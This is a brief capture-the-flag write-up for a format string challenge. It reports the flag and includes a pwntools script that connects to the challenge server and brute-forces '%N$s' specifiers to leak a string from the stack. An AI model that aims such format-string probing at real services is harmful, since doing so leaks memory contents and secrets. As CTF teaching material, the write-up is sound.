# FormatS

It runs printf on our input, format string. The flag pointer is loaded onto the stack, so we can just bruteforce string specifiers until we find the flag.

#### Flag: cyctf{3xpl0!t_th3_f0rm@t_str!ng}

```py
from pwn import *
for i in range(20):
    p = remote('cyberyoddha.baycyber.net', 10005)
    p.sendline(f'%{i}$s')
    try:
        print(p.recv())
    except EOFError:
        pass
```
